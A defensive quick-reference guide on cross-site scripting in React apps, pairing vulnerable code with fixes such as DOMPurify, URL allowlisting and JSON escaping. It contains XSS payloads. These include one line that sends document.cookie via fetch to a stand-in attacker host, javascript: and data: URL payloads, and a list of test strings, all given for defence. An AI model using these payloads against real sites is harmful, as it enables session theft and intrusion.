# XSS Attack Patterns and Defenses

Quick reference for common XSS vectors in React applications and how to prevent them.

---

## Types of XSS

| Type | Where it Happens | Example |
|------|------------------|---------|
| **Stored XSS** | Server saves malicious input, serves to others | Comment with `<script>` saved to DB |
| **Reflected XSS** | Server reflects input back immediately | Search query in URL shown on page |
| **DOM XSS** | Client-side JS processes untrusted data | `innerHTML = location.hash` |

React prevents Reflected and Stored XSS by default through JSX escaping. **DOM XSS is your responsibility.**

---

## Common Attack Vectors in React

### 1. `dangerouslySetInnerHTML`

```tsx
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Attack payload:
// <img src=x onerror="alert(document.cookie)">
// <svg onload="fetch('https://evil.com?c='+document.cookie)">

// ✅ SAFE
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### 2. URL Injection

```tsx
// ❌ VULNERABLE
<a href={userUrl}>Click me</a>
<img src={userUrl} />
<iframe src={userUrl} />

// Attack payloads:
// javascript:alert(document.cookie)
// data:text/html,<script>alert('XSS')</script>

// ✅ SAFE
const isSafeUrl = (url: string) => {
  try {
    const parsed = new URL(url, location.origin);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};
```

### 3. Dynamic Attribute Injection

```tsx
// ❌ VULNERABLE - React allows this!
<div {...userProvidedProps} />

// Attack: userProvidedProps = { dangerouslySetInnerHTML: { __html: '<script>...' }}

// ✅ SAFE - Allowlist specific props
const safeProps = {
  className: userProvidedProps.className,
  id: userProvidedProps.id,
};
<div {...safeProps} />
```

### 4. CSS Injection

```tsx
// ❌ VULNERABLE
<div style={{ background: userInput }} />

// Attack: `url('javascript:alert(1)')` (older browsers)
// Attack: `expression(alert(1))` (IE)

// ✅ SAFE - Validate CSS values
const safeCssValue = (value: string) => {
  // Only allow simple values
  return /^[a-zA-Z0-9#\s,()%.]+$/.test(value) ? value : 'inherit';
};
```

### 5. `eval()` and `new Function()`

```tsx
// ❌ VULNERABLE
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);
setInterval(userInput, 1000);

// ✅ SAFE - Never use eval with user input. Ever.
```

### 6. JSON Injection in Script Tags

```tsx
// ❌ VULNERABLE - Server-rendered JSON
<script>
  window.__DATA__ = {JSON.stringify(userData)};
</script>

// Attack: userData.name = "</script><script>alert(1)</script>"

// ✅ SAFE - Escape closing tags
const safeJsonStringify = (data: unknown) => {
  return JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
};
```

### 7. Template Literal Injection

```tsx
// ❌ VULNERABLE
const query = `
  query {
    user(name: "${userName}") { id }
  }
`;

// Attack: userName = '"); deleteAll(); //'

// ✅ SAFE - Use parameterized queries
const query = gql`
  query GetUser($name: String!) {
    user(name: $name) { id }
  }
`;
```

---

## DOMPurify Configuration Reference

```tsx
import DOMPurify from 'dompurify';

// Minimal - text formatting only
const minimal = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
  ALLOWED_ATTR: [],
});

// Links allowed
const withLinks = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,
});

// Rich content (blog posts, etc.)
const richContent = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'br', 'hr',
    'ul', 'ol', 'li',
    'b', 'i', 'em', 'strong', 'u', 's',
    'a', 'img',
    'blockquote', 'pre', 'code',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
  ],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
  ALLOW_DATA_ATTR: false,
  ADD_TAGS: [],
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input', 'button'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'style'],
});

// Force safe link behavior
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
  if (node.tagName === 'IMG') {
    // Lazy load images
    node.setAttribute('loading', 'lazy');
  }
});
```

---

## Testing for XSS

### Manual Test Payloads

Use these to test your sanitization:

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">click</a>
<a href="data:text/html,<script>alert('XSS')</script>">click</a>
<div style="background:url('javascript:alert(1)')">
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>
```

### Automated Testing

```bash
# Use OWASP ZAP or Burp Suite for automated XSS scanning
# Or use a library like xss-filters for additional validation
npm install xss-filters
```

---

## Quick Checklist

- [ ] Never use `dangerouslySetInnerHTML` without DOMPurify
- [ ] Validate all URLs before using in `href`, `src`, `action`
- [ ] Don't spread untrusted objects as props
- [ ] Never use `eval()`, `new Function()`, or string-based `setTimeout`
- [ ] Escape JSON embedded in `<script>` tags
- [ ] Implement Content Security Policy
- [ ] Test with XSS payloads before release

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
